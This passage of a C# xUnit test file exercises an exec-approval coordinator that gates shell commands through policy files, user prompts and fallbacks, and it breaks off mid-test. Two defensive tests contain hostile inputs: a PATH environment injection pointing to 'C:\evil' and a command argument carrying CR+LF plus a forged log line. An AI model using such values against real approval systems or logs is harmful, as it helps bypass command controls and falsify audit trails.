using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Xunit;
using Xunit.Abstractions;
using OpenClaw.Shared;
using OpenClaw.Shared.ExecApprovals;

namespace OpenClaw.Shared.Tests;

/// <summary>
/// Tests for ExecApprovalsCoordinator: full pipeline, observability, UI-free guarantee,
/// concurrency, production wiring inert by default, env injection guard, and log injection prevention.
/// </summary>
public class ExecApprovalsCoordinatorTests : IDisposable
{
    private readonly string _dir;
    private readonly ITestOutputHelper _output;

    // The carrier is preserved for execution, but argv[0] is pinned to the resolved
    // system image so Windows cannot re-resolve a bare "cmd.exe" at launch time.
    private static string SystemCmdPath => Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.System),
        "cmd.exe");

    // Coordinator-level requests cannot carry a custom environment: the input validator
    // denies a non-empty env with custom-env-not-supported, so PATH cannot be pinned per
    // request and resolution always uses the process PATH. A bare payload name would then
    // resolve to whatever the developer happens to have installed. On a machine with
    // coreutils ahead of System32, "hostname.exe" resolves under "C:\Program Files\...",
    // and the binder correctly refuses to pin a path containing a space, so the test would
    // fail for an unrelated reason. Naming the payload absolutely keeps these tests about
    // the coordinator's authorize-and-execute wiring. Bare-name PATH resolution is covered
    // at the binder level, where env can be injected.
    private static string SystemHostnamePath => Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.System),
        "hostname.exe");

    // The same path escaped for embedding in a JSON string literal.
    private static string SystemHostnameJson => SystemHostnamePath.Replace(@"\", @"\\");

    public ExecApprovalsCoordinatorTests(ITestOutputHelper output)
    {
        _dir = Path.Combine(Path.GetTempPath(), $"oca-coord-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_dir);
        _output = output;
    }

    public void Dispose() => Directory.Delete(_dir, recursive: true);

    // ── Helpers ───────────────────────────────────────────────────────────────

    private static JsonElement Parse(string json)
    {
        using var doc = JsonDocument.Parse(json);
        return doc.RootElement.Clone();
    }

    // ["where","hello"] reliably resolves where.exe from System32 on Windows and is a
    // plain (non-shell) executable, so it is an approvable command whose argv reaches
    // the process verbatim. Shell interpreters (cmd, powershell, …) are intentionally
    // not approvable — they would re-parse their argument tail — so they are unsuitable
    // as a stand-in for a generic allowable command here.
    private static NodeInvokeRequest Req(string argsJson)
        => new() { Id = "r1", Command = "system.run", Args = Parse(argsJson) };

    private static NodeInvokeRequest DefaultReq()
        => Req("""{"command":["where","hello"]}""");

    private void WriteStoreFile(string json)
        => File.WriteAllText(Path.Combine(_dir, "exec-approvals.json"), json);

    // Coordinator requests cannot carry a custom env (the validator returns
    // custom-env-not-supported), so a bare payload name resolves against the process
    // PATH. Pick the first candidate this host can actually pin: where a toolchain such
    // as coreutils shadows a system name, the resolved path contains a space and the
    // binder correctly refuses it, which is a different claim than the ones under test.
    private static (ExecReusableCommand? Bound, string Payload) FindBindablePayload()
    {
        foreach (var candidate in new[] { "where.exe", "whoami.exe", "hostname.exe" })
        {
            var bound = ExecReusableCommandBinder.TryBind(
                ["cmd.exe", "/d", "/s", "/c", candidate], cwd: null, env: null);
            if (bound is not null && bound.IsCarrierTransport)
                return (bound, candidate);
        }

        return (null, "");
    }

    private string LegacyPolicyPath => Path.Combine(_dir, "exec-policy.json");

    private ExecApprovalsCoordinator MakeCoordinator(
        ICanPresentEvaluator? canPresent = null,
        IExecApprovalV2PromptHandler? prompt = null,
        IOpenClawLogger? logger = null,
        TimeSpan? promptTimeout = null)
    {
        var log = logger ?? NullLogger.Instance;
        return new(
            new ExecApprovalsStore(_dir, log),
            canPresent ?? AlwaysCannotPresentEvaluator.Instance,
            prompt ?? ExecApprovalV2NullPromptHandler.Instance,
            log,
            promptTimeout);
    }

    // ── 1. No file → prompt on miss; unattended fallback denies ───────────────

    [Fact]
    public async Task NoFile_UnattendedPromptMiss_ReturnsUserDenied()
    {
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c1");
        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
    }

    [Fact]
    public async Task NoFile_AttendedPrompt_AllowsOnce()
    {
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(DefaultReq(), "c1-attended");

        Assert.True(result.IsAllow);
    }

    [Theory]
    [InlineData("allow")]
    [InlineData("deny")]
    public async Task LegacyV1Rule_IsIgnoredAndRequiresFreshV2Decision(string action)
    {
        var legacy = $$"""
        {
          "defaultAction": "deny",
          "rules": [
            { "pattern": "where *", "action": "{{action}}" }
          ]
        }
        """;
        File.WriteAllText(LegacyPolicyPath, legacy);

        var unattended = await MakeCoordinator().HandleAsync(DefaultReq(), $"v1-{action}-unattended");
        var attended = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(DefaultReq(), $"v1-{action}-attended");

        Assert.Equal(ExecApprovalV2Code.UserDenied, unattended.Code);
        Assert.True(attended.IsAllow);
        Assert.Equal(legacy, File.ReadAllText(LegacyPolicyPath));
        Assert.False(File.Exists(Path.Combine(_dir, "exec-approvals.json")));
    }

    [Fact]
    public async Task MalformedLegacyV1_IsUntouchedAndUsesFreshV2Behavior()
    {
        const string legacy = "{ this is not valid json";
        File.WriteAllText(LegacyPolicyPath, legacy);

        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "v1-malformed");

        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
        Assert.Equal(legacy, File.ReadAllText(LegacyPolicyPath));
    }

    [Fact]
    public async Task ExistingValidV2_WinsOverLegacyV1()
    {
        const string legacy =
            """{"defaultAction":"deny","rules":[{"pattern":"where *","action":"deny"}]}""";
        File.WriteAllText(LegacyPolicyPath, legacy);
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");

        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "v1-v2-wins");

        Assert.True(result.IsAllow);
        Assert.Equal(legacy, File.ReadAllText(LegacyPolicyPath));
    }

    [Fact]
    public async Task InvalidV2_WithLegacyV1_RemainsHardDenyAndPreservesBothFiles()
    {
        const string legacy =
            """{"defaultAction":"allow","rules":[{"pattern":"where *","action":"allow"}]}""";
        const string invalidV2 = "{ invalid v2 json";
        File.WriteAllText(LegacyPolicyPath, legacy);
        WriteStoreFile(invalidV2);

        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "v1-invalid-v2");

        Assert.Equal(ExecApprovalV2Code.SecurityDeny, result.Code);
        Assert.Equal(legacy, File.ReadAllText(LegacyPolicyPath));
        Assert.Equal(invalidV2, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
    }

    // ── 2. security=full → Allow ──────────────────────────────────────────────

    [Fact]
    public async Task SecurityFull_AskOff_ReturnsAllow()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c2");
        Assert.True(result.IsAllow);
    }

    // ── 3. security=deny → SecurityDeny ──────────────────────────────────────

    [Fact]
    public async Task SecurityDeny_ReturnsSecurityDeny()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"deny"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c3");
        Assert.Equal(ExecApprovalV2Code.SecurityDeny, result.Code);
    }

    // ── 4. ask=always, canPresent=false, askFallback=deny → UserDenied ────────

    [Fact]
    public async Task AskAlways_CannotPresent_FallbackDeny_ReturnsUserDenied()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"deny"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c4");
        // FallbackDecision(ExecSecurity.Deny) → ExecApprovalDecision.Deny → pass2 step2 → UserDenied
        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
        Assert.Equal("user-denied", result.Reason);
    }

    // ── 5. ask=always, canPresent=false, askFallback=full → Allow ────────────

    [Fact]
    public async Task AskAlways_CannotPresent_FallbackFull_ReturnsAllow()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"full"}}""");
        var log = new CapturingLogger();
        var result = await MakeCoordinator(logger: log).HandleAsync(DefaultReq(), "c5");
        Assert.True(result.IsAllow);
        Assert.NotNull(log.LastInfo);
        Assert.Contains("fallbackUsed=True", log.LastInfo, StringComparison.Ordinal);
    }

    // ── 6. canPresent=true, NullPromptHandler → UserDenied ───────────────────

    [Fact]
    public async Task CanPresent_NullPrompt_ReturnsUserDenied()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: ExecApprovalV2NullPromptHandler.Instance).HandleAsync(DefaultReq(), "c6");
        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
    }

    // ── AllowAlways availability plumbed into the prompt request (macOS parity) ──

    [Fact]
    public async Task Prompt_AskAlways_MarksAllowAlwaysUnavailable()
    {
        // ask=always always re-prompts, so allow-always is never offered (macOS rule).
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var capturing = new CapturingPromptHandler(ExecApprovalPromptOutcome.Deny);
        await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: capturing).HandleAsync(DefaultReq(), "caa1");
        Assert.NotNull(capturing.Captured);
        Assert.False(capturing.Captured!.AllowAlwaysAvailable);
    }

    [Fact]
    public async Task Prompt_AskOnMissAllowlistMiss_MarksAllowAlwaysAvailable()
    {
        // ask=on-miss + allowlist + no match reaches the prompt; a resolvable executable
        // yields a reusable pattern, so allow-always is offered.
        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
        var capturing = new CapturingPromptHandler(ExecApprovalPromptOutcome.Deny);
        await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: capturing).HandleAsync(DefaultReq(), "caa2");
        Assert.NotNull(capturing.Captured);
        Assert.True(capturing.Captured!.AllowAlwaysAvailable);
    }

    [Fact]
    public async Task Prompt_CanonicalSingleCommand_MarksAllowAlwaysAvailable()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
        var capturing = new CapturingPromptHandler(ExecApprovalPromptOutcome.Deny);

        await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: capturing).HandleAsync(
                Req("""{"command":["cmd.exe","/d","/s","/c","where hello"]}"""),
                "caa3");

        Assert.NotNull(capturing.Captured);
        Assert.True(capturing.Captured!.AllowAlwaysAvailable);
    }

    // ── Policy-currency re-check on the prompt path (macOS parity) ──

    [Fact]
    public async Task Prompt_PolicyTightenedDuringPrompt_FailsClosed()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
        // The owner tightens the policy to deny while the prompt is open.
        var handler = new StoreMutatingPromptHandler(
            () => WriteStoreFile("""{"version":1,"defaults":{"security":"deny"}}"""),
            ExecApprovalPromptOutcome.AllowOnce);
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: handler).HandleAsync(DefaultReq(), "cur1");
        Assert.Equal(ExecApprovalV2Code.ValidationFailed, result.Code);
        Assert.Equal("policy-changed-before-execution", result.Reason);
    }

    [Fact]
    public async Task Prompt_PolicyUnchanged_AllowsAfterCurrencyRecheck()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce)).HandleAsync(DefaultReq(), "cur2");
        Assert.True(result.IsAllow);
    }

    [Fact]
    public async Task PreApproved_AskFallbackTightenedBeforeLaunch_FailsRevalidation()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"full","ask":"off","askFallback":"full"}}""");
        var coordinator = MakeCoordinator();
        var approval = await coordinator.HandleAsync(DefaultReq(), "cur3");
        Assert.True(approval.IsAllow);

        WriteStoreFile(
            """{"version":1,"defaults":{"security":"full","ask":"off","askFallback":"deny"}}""");
        var revalidation = await coordinator.RevalidateAsync(approval.Execution!, "cur3");

        Assert.False(revalidation.IsCurrent);
        Assert.Equal("policy-changed-before-execution", revalidation.Reason);
    }

    [Fact]
    public async Task PreApproved_UnchangedPolicy_PassesExecutionBoundaryRevalidation()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var coordinator = MakeCoordinator();
        var approval = await coordinator.HandleAsync(DefaultReq(), "cur4");
        Assert.True(approval.IsAllow);

        var revalidation = await coordinator.RevalidateAsync(approval.Execution!, "cur4");

        Assert.True(revalidation.IsCurrent);
    }

    [Fact]
    public async Task Prompt_Timeout_ResolvesDeny()
    {
        // A dialog the owner never answers must not hang the request: the prompt timeout
        // cancels it and the coordinator denies.
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new TokenAwaitingPromptHandler(),
            promptTimeout: TimeSpan.FromMilliseconds(50)).HandleAsync(DefaultReq(), "to1");
        Assert.False(result.IsAllow);
    }

    // ── Security-audit-suppression gate (macOS parity) ──

    [Fact]
    public async Task AuditSuppression_NotAutoAllowed_UnderSecurityFullAskOff()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        // Control: an unrelated command is pre-approved (no prompt) under security=full/ask=off.
        Assert.True((await MakeCoordinator().HandleAsync(DefaultReq(), "aud0")).IsAllow);

        // A command referencing security.audit.suppressions is forced to an explicit decision;
        // with no UI available it fails closed instead of auto-allowing.
        var req = Req("""{"command":["where","security.audit.suppressions"]}""");
        var result = await MakeCoordinator().HandleAsync(req, "aud1");
        Assert.False(result.IsAllow);
    }

    [Fact]
    public async Task AuditSuppression_PermissiveFallback_StillDeniedWithoutUi()
    {
        // Even with askFallback=full, an audit-suppression change must never auto-allow without
        // an explicit decision: the audit gate denies rather than delegating to askFallback.
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off","askFallback":"full"}}""");
        var req = Req("""{"command":["where","security.audit.suppressions"]}""");
        var result = await MakeCoordinator().HandleAsync(req, "audf1");
        Assert.False(result.IsAllow);
        Assert.Equal("audit-suppression-requires-approval", result.Reason);
    }

    [Fact]
    public async Task AuditSuppression_AskAlwaysPermissiveFallback_StillDeniedWithoutUi()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"full"}}""");
        var req = Req("""{"command":["where","security.audit.suppressions"]}""");

        var result = await MakeCoordinator().HandleAsync(req, "audf2");

        Assert.False(result.IsAllow);
        Assert.Equal("audit-suppression-requires-approval", result.Reason);
    }

    // ── 7. canPresent=true, AllowOnce → Allow ────────────────────────────────

    [Fact]
    public async Task CanPresent_AllowOnce_ReturnsAllow()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var log = new CapturingLogger();
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce),
            logger: log).HandleAsync(DefaultReq(), "c7");
        Assert.True(result.IsAllow);
        Assert.Contains("promptAttempted=True", log.LastInfo!, StringComparison.Ordinal);
        Assert.DoesNotContain("fallbackUsed=True", log.LastInfo!, StringComparison.Ordinal);
    }

    // ── 8. canPresent=true, AllowAlways → Allow ───────────────────────────────

    [Fact]
    public async Task CanPresent_AllowAlways_ReturnsAllow()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(DefaultReq(), "c8");
        Assert.True(result.IsAllow);
    }

    // ── 9. Invariant: prompt returns Allow → InternalError ────────────────────

    [Fact]
    public async Task PromptReturnsAllowPlain_ReturnsInternalError()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.Allow))
            .HandleAsync(DefaultReq(), "c9");
        Assert.Equal(ExecApprovalV2Code.InternalError, result.Code);
        Assert.Equal("prompt-returned-allow", result.Reason);
    }

    // ── 10. Prompt throws → UserDenied, no fallback ───────────────────────────

    [Fact]
    public async Task PromptThrows_ReturnsUserDenied_FallbackNotUsed()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var log = new CapturingLogger();
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new ThrowingPromptHandler(),
            logger: log).HandleAsync(DefaultReq(), "c10");
        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
        Assert.Equal("prompt-failed", result.Reason);
        // Must not delegate to fallback after presenter failure
        Assert.Contains("fallbackUsed=False", log.LastWarn!, StringComparison.Ordinal);
    }

    // ── 11. Input invalid → ValidationFailed ─────────────────────────────────

    [Fact]
    public async Task InvalidInput_ReturnsValidationFailed()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full"}}""");
        var result = await MakeCoordinator().HandleAsync(
            Req("""{}"""), "c11");
        Assert.Equal(ExecApprovalV2Code.ValidationFailed, result.Code);
    }

    // ── 12. security=allowlist, allowlist empty, ask=off → AllowlistMiss ──────

    [Fact]
    public async Task SecurityAllowlist_EmptyList_ReturnsAllowlistMiss()
    {
        // Empty allowlist → no entry can match → AllowlistSatisfied=false → miss.
        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"off"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c12");
        Assert.Equal(ExecApprovalV2Code.AllowlistMiss, result.Code);
    }

    // ── 13. FallbackDecision(deny) → Deny, not AllowOnce ────────────────────

    [Fact]
    public async Task FallbackDecision_AskFallbackDeny_ReturnsDeny()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"deny"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c13");
        // ExecSecurity.Deny → ExecApprovalDecision.Deny → pass2 → UserDenied (fail-safe)
        Assert.False(result.IsAllow);
        Assert.NotEqual(ExecApprovalV2Code.Allow, result.Code);
    }

    // ── 14. Rail 8 — 7 log fields present ────────────────────────────────────

    [Fact]
    public async Task Rail8_AllSevenLogFieldsPresent()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"deny"}}""");
        var log = new CapturingLogger();
        await MakeCoordinator(logger: log).HandleAsync(DefaultReq(), "corr-14");

        // security=deny → LogAndReturn → Warn; check all 7 rail-8 fields
        Assert.NotNull(log.LastWarn);
        var msg = log.LastWarn!;
        Assert.Contains("corr-14", msg, StringComparison.Ordinal);
        Assert.Contains("path=new", msg, StringComparison.Ordinal);
        Assert.Contains("canonical=", msg, StringComparison.Ordinal);
        Assert.Contains("decision=deny", msg, StringComparison.Ordinal);
        Assert.Contains("reason=", msg, StringComparison.Ordinal);
        Assert.Contains("fallbackUsed=", msg, StringComparison.Ordinal);
        Assert.Contains("promptAttempted=", msg, StringComparison.Ordinal);
    }

    // ── 16. Rail 10 — coordinator in OpenClaw.Shared, not Tray ───────────────

    [Fact]
    public void Rail10_CoordinatorAssemblyIsOpenClawShared()
    {
        var asm = typeof(ExecApprovalsCoordinator).Assembly.GetName().Name;
        Assert.Equal("OpenClaw.Shared", asm);
    }

    // ── 17. Concurrency — 5 simultaneous requests don't corrupt state ─────────

    [Fact]
    public async Task Concurrency_FiveConcurrentRequests_AllReturnValidResults()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var coordinator = MakeCoordinator();
        var tasks = Enumerable.Range(0, 5)
            .Select(i => coordinator.HandleAsync(DefaultReq(), $"conc-{i}"))
            .ToList();
        var results = await Task.WhenAll(tasks);
        Assert.All(results, r => Assert.NotNull(r));
        Assert.All(results, r => Assert.True(r.IsAllow));
    }

    // ── 18. Env injection → ValidationFailed("env-blocked") ──────────────────

    [Fact]
    public async Task CustomEnv_ReturnsValidationFailed()
    {
        // security=full,ask=off rules out other denies; env PATH is always blocked
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var result = await MakeCoordinator()
            .HandleAsync(Req("""{"command":["cmd","/c","echo","hello"],"env":{"PATH":"C:\\evil"}}"""), "c18");

        Assert.Equal(ExecApprovalV2Code.ValidationFailed, result.Code);
        Assert.Equal("custom-env-not-supported", result.Reason);
    }

    // ── 19. Log injection — DisplayCommand control chars replaced in log ───────

    [Fact]
    public async Task LogInjection_ControlCharsInCommand_SanitizedInLog()
    {
        // \r\n in JSON string → actual CR+LF in the parsed command argument
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var log = new CapturingLogger();
        await MakeCoordinator(logger: log)
            .HandleAsync(Req("""{"command":["where","x\r\n[EXEC-APPROVALS] [fake] FAKE"]}"""), "c19");

        // Should allow (security=full, ask=off)
        Assert.NotNull(log.LastInfo);
        // CR+LF must not appear literally in the log line
        Assert.DoesNotContain("\r\n", log.LastInfo!, StringComparison.Ordinal);
    }

    // ── 20. Lock released after prompt throws — second call must not deadlock ────

    [Fact]
    public async Task PromptThrows_LockReleasedForSubsequentCall()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var coordinator = MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new ThrowingPromptHandler());

        var first = await coordinator.HandleAsync(DefaultReq(), "lock-1");
        Assert.Equal(ExecApprovalV2Code.UserDenied, first.Code);

        // Second call must complete — if lock was not released this would deadlock
        var second = await coordinator.HandleAsync(DefaultReq(), "lock-2");
        Assert.Equal(ExecApprovalV2Code.UserDenied, second.Code);
    }

    // ── 21a. Concurrency with actual lock contention ───────────────────────────

    [Fact]
    public async Task Concurrency_PromptPathWithLockContention_AllReturnValidResults()
    {
        // ask=always + canPresent=true → all requests enter the locked block
        // NullPromptHandler returns Deny → all should be UserDenied (no deadlock, no corruption)
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var coordinator = MakeCoordinator(canPresent: AlwaysCanPresentEvaluator.Instance);
        var tasks = Enumerable.Range(0, 5)
            .Select(i => coordinator.HandleAsync(DefaultReq(), $"cont-{i}"))
            .ToList();
        var results = await Task.WhenAll(tasks);
        Assert.All(results, r => Assert.NotNull(r));
        // NullPromptHandler returns Deny → UserDenied for all
        Assert.All(results, r => Assert.Equal(ExecApprovalV2Code.UserDenied, r.Code));
    }

    // ExecApprovalV2Result — new codes constructible (InternalError, Allow)

    [Fact]
    public void V2Result_InternalError_CodeAndReason()
    {
        var r = ExecApprovalV2Result.InternalError("invariant-violation");
        Assert.Equal(ExecApprovalV2Code.InternalError, r.Code);
        Assert.Equal("invariant-violation", r.Reason);
        Assert.False(r.IsAllow);
    }

    [Fact]
    public void V2Result_Allow_IsAllowTrueAndReasonApproved()
    {
        var exec = new ExecApprovedExecution(new[] { "git", "status" }, cwd: null, timeoutMs: 1000, env: null);
        var r = ExecApprovalV2Result.Allow(exec);
        Assert.Equal(ExecApprovalV2Code.Allow, r.Code);
        Assert.Equal("approved", r.Reason);
        Assert.True(r.IsAllow);
        Assert.Same(exec, r.Execution);
    }

    [Fact]
    public void V2Result_Allow_NullPayload_Throws()
        => Assert.Throws<ArgumentNullException>(() => ExecApprovalV2Result.Allow(null!));

    [Fact]
    public void ExecApprovedExecution_NullArgv_Throws()
        => Assert.Throws<ArgumentNullException>(() => new ExecApprovedExecution(null!, cwd: null, timeoutMs: 1000, env: null));

    [Fact]
    public void ExecApprovedExecution_EmptyArgv_Throws()
        => Assert.Throws<ArgumentException>(() => new ExecApprovedExecution(Array.Empty<string>(), cwd: null, timeoutMs: 1000, env: null));

    [Theory]
    [InlineData(0)]
    [InlineData(-1)]
    public void ExecApprovedExecution_NonPositiveTimeout_Throws(int timeoutMs)
        => Assert.Throws<ArgumentOutOfRangeException>(() =>
            new ExecApprovedExecution(new[] { "cmd" }, cwd: null, timeoutMs, env: null));

    [Fact]
    public void ExecApprovedExecution_ClampsTimeoutToSystemRunMaximum()
    {
        var exec = new ExecApprovedExecution(
            new[] { "cmd" },
            cwd: null,
            timeoutMs: int.MaxValue,
            env: null);

        Assert.Equal(ExecApprovedExecution.MaxTimeoutMs, exec.TimeoutMs);
    }

    [Fact]
    public void ExecApprovedExecution_CopiesArgvDefensively()
    {
        var argv = new[] { "cmd", "/c", "echo" };
        var exec = new ExecApprovedExecution(argv, cwd: null, timeoutMs: 1000, env: null);
        argv[0] = "TAMPERED"; // mutate the source after construction
        Assert.Equal("cmd", exec.Argv[0]);
    }

    [Fact]
    public void ExecApprovedExecution_ArgvCannotBeMutatedThroughReturnedCollection()
    {
        var exec = new ExecApprovedExecution(new[] { "cmd", "/c" }, cwd: null, timeoutMs: 1000, env: null);
        var list = Assert.IsAssignableFrom<IList<string>>(exec.Argv);

        Assert.True(list.IsReadOnly);
        Assert.Throws<NotSupportedException>(() => list[0] = "TAMPERED");
        Assert.Equal("cmd", exec.Argv[0]);
    }

    [Fact]
    public void ExecApprovedExecution_CopiesEnvDefensively()
    {
        var env = new Dictionary<string, string> { ["FOO"] = "bar" };
        var exec = new ExecApprovedExecution(new[] { "x" }, cwd: null, timeoutMs: 1000, env: env);
        env["FOO"] = "TAMPERED"; // mutate the source after construction
        Assert.Equal("bar", exec.Env!["FOO"]);
    }

    [Fact]
    public void ExecApprovedExecution_EnvCannotBeMutatedThroughReturnedDictionary()
    {
        var exec = new ExecApprovedExecution(
            new[] { "cmd" },
            cwd: null,
            timeoutMs: 1000,
            env: new Dictionary<string, string> { ["FOO"] = "bar" });

        var dict = Assert.IsAssignableFrom<IDictionary<string, string>>(exec.Env);
        Assert.True(dict.IsReadOnly);
        Assert.Throws<NotSupportedException>(() => dict["FOO"] = "TAMPERED");
        Assert.Equal("bar", exec.Env!["FOO"]);
    }

    [Fact]
    public void ExecApprovedExecution_ToCommandRequest_CarriesAllApprovedExecutionFields()
    {
        var exec = new ExecApprovedExecution(
            new[] { @"C:\Windows\System32\cmd.exe", "/c", "echo", "hello" },
            cwd: @"C:\work",
            timeoutMs: 1234,
            env: new Dictionary<string, string> { ["FOO"] = "bar" });

        var request = exec.ToCommandRequest();

        Assert.Same(exec.Argv, request.Argv);
        Assert.Equal(exec.Cwd, request.Cwd);
        Assert.Equal(exec.TimeoutMs, request.TimeoutMs);
        Assert.Equal("bar", request.Env!["FOO"]);
        request.Env["FOO"] = "caller-mutation";
        Assert.Equal("bar", exec.Env!["FOO"]);
    }

    // Allow payload carries the canonical argv on both allow exits

    [Fact]
    public async Task Allow_PreApproved_CarriesCanonicalArgvPayload()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "payload-pre");
        Assert.True(result.IsAllow);
        Assert.NotNull(result.Execution);
        // argv[0] is the RESOLVED absolute path, not the raw "where".
        Assert.True(Path.IsPathFullyQualified(result.Execution!.Argv[0]));
        Assert.EndsWith("where.exe", result.Execution.Argv[0], StringComparison.OrdinalIgnoreCase);
        Assert.Equal(new[] { "hello" }, result.Execution.Argv.Skip(1).ToArray());
        Assert.Null(result.Execution.Env); // DefaultReq carries no env
    }

    [Fact]
    public async Task Allow_CustomEnvIsRejectedBeforePayload()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var req = Req("""{"command":["where","hello"],"env":{"FOO":"bar"}}""");
        var result = await MakeCoordinator().HandleAsync(req, "payload-env");
        Assert.False(result.IsAllow);
        Assert.Equal("custom-env-not-supported", result.Reason);
    }

    [Fact]
    public async Task Allow_PostPrompt_CarriesCanonicalArgvPayload()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(DefaultReq(), "payload-post");
        Assert.True(result.IsAllow);
        Assert.NotNull(result.Execution);
        Assert.True(Path.IsPathFullyQualified(result.Execution!.Argv[0]));
        Assert.EndsWith("where.exe", result.Execution.Argv[0], StringComparison.OrdinalIgnoreCase);
        Assert.Equal(new[] { "hello" }, result.Execution.Argv.Skip(1).ToArray());
    }

    // End-to-end handoff: coordinator payload → runner plan (no shell)
    // Guards against coordinator and runner drifting apart: the payload the
    // coordinator emits must be directly executable by LocalCommandRunner without
    // any shell. Previously the coordinator emitted the raw argv ("cmd") which the
    // direct-argv runner rejects.
    [Fact]
    public async Task Allow_Payload_IsAcceptedByDirectArgvRunner()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "handoff");
        Assert.True(result.IsAllow);

        // Map the approved payload to a CommandRequest exactly as the production
        // caller will, then verify the resulting plan is non-shell.
        var plan = LocalCommandRunner.PlanExecution(new CommandRequest
        {
            Argv = result.Execution!.Argv,
            Cwd = result.Execution.Cwd,
            TimeoutMs = result.Execution.TimeoutMs,
            Env = result.Execution.Env is null ? null : new Dictionary<string, string>(result.Execution.Env),
        });

